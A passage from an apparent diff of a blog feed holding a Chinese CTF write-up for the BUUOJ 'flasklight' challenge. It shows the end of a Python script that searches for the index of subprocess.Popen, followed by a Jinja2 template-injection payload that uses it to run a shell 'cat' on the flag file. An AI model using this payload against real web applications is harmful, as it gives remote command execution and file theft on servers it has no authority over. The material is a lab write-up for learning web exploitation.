for:&lt;\/h2&gt;\W+&lt;h3&gt;(.*)&lt;\/h3&gt;&quot;</span>, r.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        res = html.unescape(res[<span class="number">0</span>])</span><br><span class="line">        print(<span class="built_in">str</span>(i) + <span class="string">&quot; | &quot;</span> + res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;subprocess.Popen&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            index = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">print(<span class="string">&quot;indexo of subprocess.Popen:&quot;</span> + <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
+<p>得到位置之后直接拿flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <categories>
         <category>WriteUp</category>
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Web</tag>
         <tag>BUUOJ</tag>
       </tags>
   </entry>
